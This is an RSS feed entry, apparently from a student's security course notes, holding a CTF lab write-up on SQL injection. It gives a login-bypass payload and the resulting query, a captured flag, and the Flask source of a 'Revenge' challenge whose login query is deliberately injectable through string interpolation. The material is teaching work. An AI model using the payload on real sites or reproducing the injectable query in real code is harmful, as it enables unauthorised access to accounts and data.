@@ -1,0 +1,99 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SBK Hugo Site</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/sql-injection/</link><description>Recent content on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/docs/security/course/ntust-ws/sql-injection/index.xml" rel="self" type="application/rss+xml"/><item><title>Simple Web 0x03(Lab - Log me in + Revenge)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/</guid><description>&lt;h1 id="simple-web-0x03lab---log-me-in--revenge">
+ Simple Web 0x03(Lab - Log me in + Revenge)
+ &lt;a class="anchor" href="#simple-web-0x03lab---log-me-in--revenge">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8200/">http://h4ck3r.quest:8200/&lt;/a>
+Challenge: &lt;a href="http://h4ck3r.quest:8201/">http://h4ck3r.quest:8201/&lt;/a>&lt;/p>
+&lt;h2 id="exploit---sqli">
+ Exploit - &lt;code>SQLi&lt;/code>
+ &lt;a class="anchor" href="#exploit---sqli">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>Payload → &lt;code>') or ('1'='1') -- #&lt;/code>
+SELECT * FROM admin WHERE (username=&amp;rsquo;&amp;rsquo;) or (&amp;lsquo;1&amp;rsquo;=&amp;lsquo;1&amp;rsquo;) &amp;ndash; #&amp;rsquo;) AND (password=&amp;lsquo;MTIz&amp;rsquo;)&lt;/li>
+&lt;/ul>
+&lt;p>Flag: &lt;code>FLAG{b4by_sql_inj3cti0n}&lt;/code>&lt;/p>
+&lt;h2 id="revenge-source-code">
+ Revenge source code
+ &lt;a class="anchor" href="#revenge-source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">from flask import Flask, render_template, redirect, request, g, Response
+import sqlite3
+
+app = Flask(__name__)
+
+
+def get_db():
+ db = getattr(g, &amp;#39;_database&amp;#39;, None)
+ if db is None:
+ db = g._database = sqlite3.connect(&amp;#39;/tmp/database.db&amp;#39;)
+ db.row_factory = sqlite3.Row
+ return db
+
+
+@app.before_first_request
+def init_db():
+ cursor = get_db().cursor()
+ cursor.execute(&amp;#34;&amp;#34;&amp;#34;
+ CREATE TABLE IF NOT EXISTS &amp;#34;admin&amp;#34; (
+ &amp;#34;username&amp;#34; TEXT NOT NULL,
+ &amp;#34;password&amp;#34; TEXT NOT NULL
+ )
+ &amp;#34;&amp;#34;&amp;#34;)
+ cursor.execute(&amp;#34;SELECT COUNT(*) as count FROM admin WHERE username=&amp;#39;admin&amp;#39;&amp;#34;)
+ count = cursor.fetchone()[&amp;#39;count&amp;#39;]
+ if count == 0:
+ import secrets
+ cursor.execute(&amp;#34;INSERT INTO admin (username, password) VALUES (?,?)&amp;#34;,
+ (&amp;#39;admin&amp;#39;, secrets.token_urlsafe()))
+ get_db().commit()
+
+
+@app.teardown_appcontext
+def close_connection(exception):
+ db = getattr(g, &amp;#39;_database&amp;#39;, None)
+ if db is not None:
+ db.close()
+
+
+@app.route(&amp;#34;/&amp;#34;)
+def home():
+ return render_template(&amp;#34;index.html&amp;#34;,
+ failed=request.args.get(&amp;#39;failed&amp;#39;) != None)
+
+
+@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
+def login():
+ username = request.form.get(&amp;#39;username&amp;#39;)
+ password = request.form.get(&amp;#39;password&amp;#39;)
+
+ if not username or not password:
+ return redirect(&amp;#34;/?failed&amp;#34;)
+
+ cur = get_db().execute(f&amp;#34;SELECT * FROM admin WHERE (username=&amp;#39;{username}&amp;#39;)&amp;#34;)
+ res = cur.fetchone()
+ cur.close()
+
+ if res[&amp;#39;username&amp;#39;] == &amp;#39;admin&amp;#39; and res[&amp;#39;password&amp;#39;] == password:
+ return &amp;#34;FLAG: FLAG{&amp;lt;REDACTED&amp;gt;}&amp;#34;
+
+ return redirect(&amp;#34;/?failed&amp;#34;)
+
+
+
+@app.route(&amp;#34;/source&amp;#34;)
+def source():
+ import re
+ source_code = open(__file__).read()
+ source_code = re.sub(r&amp;#39;FLAG{[^}\s]+}&amp;#39;, &amp;#39;FLAG{&amp;lt;REDACTED&amp;gt;}&amp;#39;, source_code, 1)
+ return Response(source_code, mimetype=&amp;#39;text/plain&amp;#39;)
+
+
+if __name__ == &amp;#39;__main__&amp;#39;:
+ app.run(debug=True)
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item></channel></rss>
